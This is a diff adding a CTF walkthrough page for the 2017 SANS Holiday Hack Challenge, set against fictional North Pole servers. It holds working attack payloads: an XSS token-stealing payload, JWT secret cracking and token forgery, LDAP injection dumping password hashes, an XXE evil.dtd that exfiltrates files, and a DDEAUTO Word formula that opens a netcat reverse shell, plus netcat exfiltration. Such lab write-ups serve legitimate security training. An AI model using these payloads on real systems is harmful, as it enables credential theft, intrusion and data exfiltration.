+        } else {
+            token = localStorage.getItem(&quot;np-auth&quot;);
+            if (token) {
+                $.post( &quot;/login&quot;, { auth_token: token }).done(function( result ) {
+                    if (result.bool) {
+                        window.location.href = result.link;
+                    }
+                })
+            }
+        }
+    &lt;/script&gt;
+</code></pre>
+
+<div class="admonition tip">
+<p class="admonition-title">Tip</p>
+<p>For more on local storage, read <a href="https://www.smashingmagazine.com/2010/10/local-storage-and-how-to-use-it/">Local Storage And How To Use It On Websites</a>.</p>
+</div>
+<p>Hints in the game indicate that Wunorse Openslae responds to helpdesk tickets to reset passwords for the elves, and that he may be susceptible to XSS attack.  Since we don't have a password, perhaps we can steal a valid token instead.</p>
+<p>Browse to the logon page http://edb.northpolechristmastown.com and click on the Forgot Password link.  Enter a valid username (alabaster.snowball) and e-mail address (alabaster.snowball@northpolechristmastown.com), then enter the following Cross Site Scripting (XSS) payload into the message field on the password reset page:</p>
+<pre><code class="html">&lt;BODY ONLOAD=window.location='http://192.0.2.123:8000/?token='+localStorage.getItem('np-auth')&gt;
+</code></pre>
+
+<p>This will grab the value of the np-auth token stored in the victim's browser and send it as a parameter in an HTTP GET request to the server specified in the URL.</p>
+<div class="admonition note">
+<p class="admonition-title">Note</p>
+<p>The message body text area on the web form is checked for cross site scripting attacks, the logic of which is visible in the javascript of the page.  It is only a rudimentary check that looks for SCRIPT tags, so use a BODY tag instead to bypass the input validation.</p>
+</div>
+<p>Meanwhile on the attacker PC, start a quick and dirty web server using Python and wait for the request from the victim's browser.</p>
+<pre><code class="plain">root@kali:/home/hh17/edb# python -M SimpleHTTPServer 8000
+
+192.0.2.123 - - [04/Jan/2018 17:18:05] &quot;GET /?token=null HTTP/1.1&quot; 200 -
+
+35.196.239.128 - - [04/Jan/2018 17:18:19] &quot;GET /?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZiIsImV4cGlyZXMiOiIyMDE3LTA4LTE2IDEyOjAwOjQ3LjI0ODA5MyswMDowMCIsInVpZCI6ImFsYWJhc3Rlci5zbm93YmFsbCJ9.M7Z4I3CtrWt4SGwfg7mi6V9_4raZE5ehVkI9h04kr6I HTTP/1.1&quot; 200 -
+</code></pre>
+
+<p>The first request is from your own browser, as the XSS payload is rendered on the ticket confirmation page after submitting the form.  The second request is from the victim, and includes the np-auth token as a parameter.  The long string shown in the output above after token= is a Java Web Token (JWT).  Decode it in python using pyjwt.</p>
+<pre><code class="bash">root@kali:~/hh17/edb# pip install PyJWT
+Collecting PyJWT
+  Downloading PyJWT-1.5.3-py2.py3-none-any.whl
+Installing collected packages: PyJWT
+Successfully installed PyJWT-1.5.3
+root@kali:~/hh17/edb# python
+
+Python 2.7.13 (default, Jan 19 2017, 14:48:08) 
+[GCC 6.3.0 20170118] on linux2
+Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.
+
+&gt;&gt;&gt; import jwt
+
+&gt;&gt;&gt; jwt.decode('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZiIsImV4cGlyZXMiOiIyMDE3LTA4LTE2IDEyOjAwOjQ3LjI0ODA5MyswMDowMCIsInVpZCI6ImFsYWJhc3Rlci5zbm93YmFsbCJ9.M7Z4I3CtrWt4SGwfg7mi6V9_4raZE5ehVkI9h04kr6I', verify=False) 
+{u'dept': u'Engineering', u'ou': u'elf', u'expires': u'2017-08-16 12:00:47.248093+00:00', u'uid': u'alabaster.snowball'}
+</code></pre>
+
+<p>Google for a JWT key cracking tool, and come up with https://github.com/brendan-rius/c-jwt-cracker.  </p>
+<pre><code class="plain">root@kali:~/hh17/edb# git clone https://github.com/brendan-rius/c-jwt-cracker.git
+Cloning into 'c-jwt-cracker'...
+remote: Counting objects: 58, done.
+remote: Total 58 (delta 0), reused 0 (delta 0), pack-reused 58
+Unpacking objects: 100% (58/58), done.
+root@kali:~/hh17/edb# cd c-jwt-cracker/
+root@kali:~/hh17/edb/c-jwt-cracker# make
+gcc -I /usr/include/openssl -g -std=gnu99 -O3   -c -o main.o main.c
+gcc -I /usr/include/openssl -g -std=gnu99 -O3   -c -o base64.o base64.c
+gcc -o jwtcrack main.o base64.o -lssl -lcrypto -lpthread
+root@kali:~/hh17/edb/c-jwt-cracker/jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiYWRtaW5pc3RyYXRvcnMiLCJvdSI6Imh1bWFuIiwiZXhwaXJlcyI6IjIwMTctMTItMjMgMjI6MDU6NTQuMjgyMjg5KzAwOjAwIiwidWlkIjoic2FudGEuY2xhdXMifQ.WfER9PlojDSzsP8MCtutSZftRMblDyQniGXRqrS358U
+Secret is &quot;3lv3s&quot;
+</code></pre>
+
+<p>Notice that the expiration time in the token we captured is expired.  Set the expiration date in the future and then encode the token using the <strong>3lv3s</strong> key cracked in the previous step.</p>
+<pre><code class="plain">&gt;&gt;&gt; jwt.encode({u'dept': u'Engineering', u'ou': u'elf', u'expires': u'2019-08-16 12:00:47.248093+00:00', u'uid': u'alabaster.snowball'}, '3lv3s', algorithm='HS256')
+'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZiIsImV4cGlyZXMiOiIyMDE5LTA4LTE2IDEyOjAwOjQ3LjI0ODA5MyswMDowMCIsInVpZCI6ImFsYWJhc3Rlci5zbm93YmFsbCJ9.m1GhT_u-gQ_SWXY-ZGwCZxw6nqehkvKyO0a65U6Nc5U'
+</code></pre>
+
+<p>Open the browser developer tools using the F12 key, and go to the Console tab.  Type the following javascript function to set the token, then reload the EDB page to bypass the logon page.</p>
+<pre><code class="javascript">localStorage.setItem('np-auth','eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZiIsImV4cGlyZXMiOiIyMDE5LTA4LTE2IDEyOjAwOjQ3LjI0ODA5MyswMDowMCIsInVpZCI6ImFsYWJhc3Rlci5zbm93YmFsbCJ9.m1GhT_u-gQ_SWXY-ZGwCZxw6nqehkvKyO0a65U6Nc5U')
+</code></pre>
+
+<p>You should now be looking at a web form.  Notice that in the menu, there is a Santa Panel option that asks for Santa's password.</p>
+<p><img alt="Screenshot" src="img/edb-form.png" /></p>
+<p>Browse through an interception proxy like Burpsuite.  Enter <code>))(|(cn=</code> in the Elf Name field, select <em>First,Last,Email</em> for the column list and then click Search.  In the interception proxy, change the POST data to read:</p>
+<pre><code class="plain">name=))(%7C(cn%3D&amp;isElf=True&amp;attributes=profilePath%2Cuid%2CuserPassword%2Cmail
+</code></pre>
+
+<p>The name string will change the underlying LDAP query so that it returns all entries regardless of whether the entity is an elf, reindeer or human.  The updated attribute list will cause the server to return username and password hash for each entity.  The usernames and passwords will not appear in the webpage, but they will be in the JSON returned by the server, and can be read from the interception proxy.</p>
+<p><img alt="Screenshot" src="img/edb-json.png" /></p>
+<p>Additional background on this type of attack can be found on the SANS Penetration Testing Blog article <a href="https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap">Understanding and Exploiting Web-based LDAP</a>.</p>
+<p><strong>Approach #2: Enumerate the LDAP server</strong></p>
+<p>Examine the nmap scan results and notice that the server is listening on port tcp/389, which is an LDAP server.</p>
+<p>Use SSH port forwarding to access port 389 on 10.142.0.6, then connect to the ldap service and download its contents, which includes password hashes.</p>
+<pre><code class="plain">root@kali:~/hh17/edb# ldapsearch -x -h 127.0.0.1 -p 389 -b &quot;dc=northpolechristmastown,dc=com&quot;
+# extended LDIF
+#
+# LDAPv3
+# base &lt;dc=northpolechristmastown,dc=com&gt; with scope subtree
+# filter: (objectclass=*)
+# requesting: ALL
+#
+
+# northpolechristmastown.com
+dn: dc=northpolechristmastown,dc=com
+objectClass: dcObject
+objectClass: organization
+dc: northpolechristmastown.com
+
+&lt;output shortened&gt;
+
+# santa, human, northpolechristmastown.com
+dn: cn=santa,ou=human,dc=northpolechristmastown,dc=com
+objectClass: addressbookPerson
+c: US
+cn: santa
+department: administrators
+description: A round, white-bearded, jolly old man in a red suit, who lives at
+  the North Pole, makes toys for children, and distributes gifts at Christmast
+ ime. AKA - The Boss!
+facsimileTelephoneNumber: 123-456-8893
+gn: Santa
+l: North Pole
+mail: santa.claus@northpolechristmastown.com
+ou: human
+postOfficeBox: 126
+postalAddress: Candy Street
+postalCode: 543210
+profilePath: /img/elves/santa.png
+sn: Claus
+st: AK
+street: Santa Claus Lane
+telephoneNumber: 123-456-7893
+uid: santa.claus
+userPassword:: Y2RhYmViOTZiNTA4ZjI1Zjk3YWIwZjE2MmVhYzVhMDQ=
+
+# search result
+search: 2
+result: 0 Success
+
+# numResponses: 26
+# numEntries: 25
+</code></pre>
+
+<p>Base64 decode the password hashes before using them any further.</p>
+<pre><code class="plain">root@kali:~/hh17/edb# echo -n &quot;Y2RhYmViOTZiNTA4ZjI1Zjk3YWIwZjE2MmVhYzVhMDQ=&quot; | base64 -d
+cdabeb96b508f25f97ab0f162eac5a04
+</code></pre>
+
+<p><strong>Regardless of which approach, continue here..</strong></p>
+<p>Here are the resulting password hashes:</p>
+<table>
+<thead>
+<tr>
+<th>uid</th>
+<th>userPassword</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>rudolph</td>
+<td>ff943fe99491b32ea387489106517af4</td>
+</tr>
+<tr>
+<td>blitzen</td>
+<td>ff943fe99491b32ea387489106517af4</td>
+</tr>
+<tr>
+<td>donner</td>
+<td>ff943fe99491b32ea387489106517af4</td>
+</tr>
+<tr>
+<td>cupid</td>
+<td>ff943fe99491b32ea387489106517af4</td>
+</tr>
+<tr>
+<td>comet</td>
+<td>ff943fe99491b32ea387489106517af4</td>
+</tr>
+<tr>
+<td>vixen</td>
+<td>ff943fe99491b32ea387489106517af4</td>
+</tr>
+<tr>
+<td>prancer</td>
+<td>ff943fe99491b32ea387489106517af4</td>
+</tr>
+<tr>
+<td>dancer</td>
+<td>ff943fe99491b32ea387489106517af4</td>
+</tr>
+<tr>
+<td>dasher</td>
+<td>ff943fe99491b32ea387489106517af4</td>
+</tr>
+<tr>
+<td>tarpin.mcjinglehauser</td>
+<td>f259e9a289c4633fc1e3ab11b4368254</td>
+</tr>
+<tr>
+<td>holly.evergreen</td>
+<td>031ef087617c17157bd8024f13bd9086</td>
+</tr>
+<tr>
+<td>mary.sugarplum</td>
+<td>b9c124f223cdc64ee2ae6abaeffbcbfe</td>
+</tr>
+<tr>
+<td>sparkle.redberry</td>
+<td>82161cf4b4c1d94320200dfe46f0db4c</td>
+</tr>
+<tr>
+<td>wunorse.openslae</td>
+<td>9fd69465699288ddd36a13b5b383e937</td>
+</tr>
+<tr>
+<td>minty.candycane</td>
+<td>bcf38b6e70b907d51d9fa4154954f992</td>
+</tr>
+<tr>
+<td>shimmy.upatree</td>
+<td>d0930efed8e75d7c8ed2e7d8e1d04e81</td>
+</tr>
+<tr>
+<td>pepper.minstix</td>
+<td>d0930efed8e75d7c8ed2e7d8e1d04e81</td>
+</tr>
+<tr>
+<td>bushy.evergreen</td>
+<td>3d32700ab024645237e879d272ebc428</td>
+</tr>
+<tr>
+<td>alabaster.snowball</td>
+<td>17e22cc100b1806cdc3cf3b99a3480b5</td>
+</tr>
+<tr>
+<td>jessica.claus</td>
+<td>16268da802de6a2efe9c672ca79a7071</td>
+</tr>
+<tr>
+<td>santa.claus</td>
+<td>cdabeb96b508f25f97ab0f162eac5a04</td>
+</tr>
+</tbody>
+</table>
+<p>Lookup the password hashes using the <a href="https://isc.sans.edu/tools/reversehash.html">SANS reverse hash lookup tool</a>, and find password for santa.claus account.</p>
+<pre><code class="plain">md5 hash cdabeb96b508f25f97ab0f162eac5a04 = 1iwantacookie
+</code></pre>
+
+<p>Log into the web interface using username: <strong>santa.claus</strong> password: <strong>1iwantacookie</strong></p>
+<div class="admonition note">
+<p class="admonition-title">Note</p>
+<p>When the LDAP server access was blocked, Santa's password was changed.  The new hash is d8b4c05a35b0513f302a85c409b4aab3 and the password is 001cookielips001</p>
+</div>
+<p>Open the menu in the right corner and select <strong>Santa Panel</strong>. Provide Santa's password when asked, and then view the letter sent to Santa from the Wizard of Oz.</p>
+<h1 id="north-pole-police-department">North Pole Police Department</h1>
+<p>Browse to https://nppd.northpolechristmastown.com and click on the Infractions link.  This server is publicly accessible and does not require any port forwarding.</p>
+<p><strong>Task #1: How many infractions are needed to be on Santa's naughty list?</strong></p>
+<p>Use a search string of &gt;1900-01-01 to view all entries in the database, then click on the Download link to obtain the data in JSON format.</p>
+<p>Use a JSON to CSV tool like the one at https://JSON-CSV.com to get the data into CSV form, then load it into a spreadsheet program.  Microsoft Excel and Google Sheets are both well suited for this task.  </p>
+<p>I used the countif() function to associate the number of infractions from the NPPD database with the naughty or nice list found on the SMB file server, then created a pivot table to analyze the data.</p>
+<p><img alt="Screenshot" src="img/nppd-pivot-1.png" /></p>
+<p>No one on the naughty list has fewer than 3 infractions.  Some people with 3-4 infractions are on the naughty list, but everyone with 5 or more infractions made it to the list.</p>
+<p><strong>Task #2: Who are the munchkin moles?</strong></p>
+<p>There is no explicit listing of munchkin moles provided, so we'll have to make an educated guess.</p>
+<p>Recall the document on the SMB file server named "BOLO - Munchkin Mole Report.docx", which contains the names of two confirmed munchkins posing as elves (Boq Questrian and Bini Aru), and lists three behaviors that they engaged in (aggravated pulling of hair, giving super atomic wedgies, and throwing rocks at people).  Observe that the infractions dataset shows the confirmed munchkins each performed at least two of these three documented behaviors.</p>
+<p>I had difficulty modeling this in a pivot table, so I imported the data into a SQLite database.  The individuals I'm looking for will have at least 2 distinct infractions from the list provided by the BOLO document.  Here's how it's done:</p>
+<pre><code>root@kali:~/hh17/nppd# ls
+infractions.csv  Naughty and Nice List.csv
+
+root@kali:~/hh17/nppd# sqlite3 analysis.db
+SQLite version 3.16.2 2017-01-06 16:32:41
+Enter &quot;.help&quot; for usage hints.
+
+sqlite&gt; .mode csv
+sqlite&gt; .import infractions.csv infractions
+
+sqlite&gt; .schema infractions
+CREATE TABLE infractions(
+  &quot;﻿&quot;&quot;count&quot;&quot;&quot; TEXT,
+  &quot;query&quot; TEXT,
+  &quot;infractions__status&quot; TEXT,
+  &quot;infractions__severity&quot; TEXT,
+  &quot;infractions__title&quot; TEXT,
+  &quot;infractions__coals__001&quot; TEXT,
+  &quot;infractions__coals__002&quot; TEXT,
+  &quot;infractions__coals__003&quot; TEXT,
+  &quot;infractions__coals__004&quot; TEXT,
+  &quot;infractions__coals__005&quot; TEXT,
+  &quot;infractions__date&quot; TEXT,
+  &quot;infractions__name&quot; TEXT
+);
+
+sqlite&gt; SELECT infractions__name 
+   ...&gt;   FROM infractions 
+   ...&gt;   WHERE (
+   ...&gt;     infractions__title = &quot;Aggravated pulling of hair&quot; 
+   ...&gt;     OR infractions__title = &quot;Giving super atomic wedgies&quot; 
+   ...&gt;     OR infractions__title = &quot;Throwing rocks (at people)&quot;
+   ...&gt;   ) 
+   ...&gt;   GROUP BY infractions__name 
+   ...&gt;   HAVING count(DISTINCT infractions__title) &gt; 1;
+
+&quot;Beverly Khalil&quot;
+&quot;Bini Aru&quot;
+&quot;Boq Questrian&quot;
+&quot;Kirsty Evans&quot;
+&quot;Nina Fitzgerald&quot;
+&quot;Sheri Lewis&quot;
+&quot;Wesley Morton&quot;
+</code></pre>
+
+<p>The listing of names at the end will be our suspects.  Hopefully elves and munchkins are presumed innocent until proven guilty.. I know I wouldn't want to be thrown in jail based on only a SQL query!</p>
+<h1 id="elf-as-a-service-eaas">Elf as a Service (EaaS)</h1>
+<p>Use SSH port forwarding to access port 80 on 10.142.0.13.  Browse to the web site and find that there is a file upload form on the page http://eaas.northpolechristmastown.com/Home/DisplayXML.  The website provides a sample form http://eaas.northpolechristmastown.com/XMLFile/Elfdata.xml that shows the format of the upload file should be XML.</p>
+<p>Attempt to exploit a possible XEE vulnerability in the XML upload function.</p>
+<div class="admonition note">
+<p class="admonition-title">Note</p>
+<p>XML External Entity (XEE) attack targets applications that have a weakly configured XML parser that can be used to access files outside the intended scope of the application, including sensitive data in system folders on the server.  An article posted on the SANS Penetration Testing blog, <a href="https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities">Exploiting XXE Vulnerabilities in IIS/.NET</a>, provides more information on this topic.</p>
+</div>
+<p>Create an evil dtd file for the EaaS server to download from the attacker PC.  This file contains instructions for the EaaS server to access a file called "c:\greatbook.txt" and place its contents in a variable called "stolendata", then to make an HTTP call to the attacker PC's IP address with a GET parameter using the value of stolendata.</p>
+<pre><code class="xml">&lt;!ENTITY % stolendata SYSTEM &quot;file:///c:/greatbook.txt&quot;&gt;
+&lt;!ENTITY % inception &quot;&lt;!ENTITY &amp;#x25; sendit SYSTEM 'http://192.0.2.123:8000/?%stolendata;'&gt;&quot;&gt;
+</code></pre>
+
+<p>Create an XML payload and upload it to the EaaS server.  This contains instructions for the XML parser to download and process the evil.dtd file from the attacker PC.</p>
+<pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;!DOCTYPE demo [
+    &lt;!ELEMENT demo ANY &gt;
+    &lt;!ENTITY % extentity SYSTEM &quot;http://192.0.2.123:8000/evil.dtd&quot;&gt;
+    %extentity;
+    %inception;
+    %sendit;
+    ]
+&gt;
+</code></pre>
+
+<p>Meanwhile, start the web server on the attacker PC and collect the results in its log output:</p>
+<pre><code class="plain">root@kali:~/hh17/eaas# python -m SimpleHTTPServer 8000 
+
+35.185.118.225 - - [18/Dec/2017 21:55:42] &quot;GET /evil.dtd HTTP/1.1&quot; 200 -
+
+35.185.118.225 - - [18/Dec/2017 21:55:42] &quot;GET /?http://eaas.northpolechristmastown.com/xMk7H1NypzAqYoKw/greatbook6.pdf HTTP/1.1&quot; 200 -
+</code></pre>
+
+<p>The first request is the EaaS web server fetching the evil.dtd file, and the second request is the EaaS server sending us the contents of the greatbook.txt file.</p>
+<p>Finally, download page 6 of the Great Book using the URL sent by the EaaS server above.</p>
+<pre><code class="plain">root@kali:~/hh17/eaas# wget http://eaas.northpolechristmastown.com/xMk7H1NypzAqYoKw/greatbook6.pdf
+</code></pre>
+
+<h1 id="elf-machine-interfaces-emi">Elf-Machine Interfaces (EMI)</h1>
+<p>Recall from Santa's inbox on the EWA server that Alabaster Snowball has asked for a copy of a gingerbread cookie recipe to be e-mailed to him, that he hinted that he'd open any docx attachment and click on prompts that appear, and that he says he's installed netcat in his executable path.</p>
+<p><img alt="Screenshot" src="img/mail-alabaster.png" /></p>
+<p>Read the SensePost article on <a href="https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/">Macro-less Code Exec in MSWord</a> for some background on this vulnerability and how to attack it.</p>
+<p>Create a Word document "gingerbread cookie recipe.docx" and add the following formula.</p>
+<pre><code class="plain">{DDEAUTO c:\\windows\\system32\\cmd.exe &quot;/k nc -e cmd.exe 192.0.2.123 8001&quot;}
+</code></pre>
+
+<p>Using the EWA server, send this to Alabaster.Snowball@northpolechristmastown.com with the file attached and the words "gingerbread cookie recipe".</p>
+<p>Meanwhile on the attacker PC, start a netcat listener and wait for the shell:</p>
+<pre><code class="plain">root@kali:~/hh17/emi# nc -nvlp 8001
+listening on [any] 8001 ...
+connect to [192.168.0.131] from (UNKNOWN) [35.185.57.190] 51038
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Users\alabaster_snowball&gt;
+</code></pre>
+
+<div class="admonition note">
+<p class="admonition-title">Note</p>
+<p>Microsoft recently closed this hole, however you can restore the functionality in Word by setting a registry key.  Read more at the Sophos Naked Security blog here: <a href="https://nakedsecurity.sophos.com/2017/12/19/microsoft-word-slams-the-door-on-ddeauto-malware-attacks/">Microsoft Word slams the door on DDEAUTO malware attacks</a>.</p>
+</div>
+<p>Use the reverse shell to locate page 7 of The Great Book and exfiltrate it from the server using netcat:</p>
+<pre><code class="plain">C:\&gt; nc 192.0.2.123 8001 &lt; C:\GreatBookPage7.pdf
+</code></pre>
+
+<pre><code class="plain">root@kali:~/hh17/emi# nc -nvlp 8001 &gt; GreatBookPage7.pdf
+</code></pre>
+
+<p>Or, copy the file to the C:\inetpub\wwwroot\ and download it using wget:</p>
+<pre><code class="plain">C:\&gt; copy C:\GreatBookPage7.pdf C:\inetpub\wwwroot\mySuperSecretFilename.pdf
+</code></pre>
+
+<pre><code class="plain">root@kali:~/hh17/emi# wget http://emi.northpolechristmastown.com/mySuperSecretFilename.pdf
+</code></pre>
+              
+            </div>
+          </div>
+          <footer>
+  
+    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
+      
+        <a href="terminals.html" class="btn btn-neutral float-right" title="Terminals">Next <span class="icon icon-circle-arrow-right"></span></a>
+      
+      
+        <a href="index.html" class="btn btn-neutral" title="Introduction"><span class="icon icon-circle-arrow-left"></span> Previous</a>
+      
+    </div>
+  
+
+  <hr/>
+
+  <div role="contentinfo">
+    <!-- Copyright etc -->
+    
+  </div>
+
+  Built with <a href="http://www.mkdocs.org">MkDocs</a> using a <a href="https://github.com/snide/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>.
+</footer>
+      
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+
+  <div class="rst-versions" role="note" style="cursor: pointer">
+    <span class="rst-current-version" data-toggle="rst-current-version">
+      
+      
+        <span><a href="index.html" style="color: #fcfcfc;">&laquo; Previous</a></span>
+      
+      
+        <span style="margin-left: 15px"><a href="terminals.html" style="color: #fcfcfc">Next &raquo;</a></span>
+      
+    </span>
+</div>
+    <script>var base_url = '.';</script>
+    <script src="js/theme.js" defer></script>
+
+</body>
+</html>
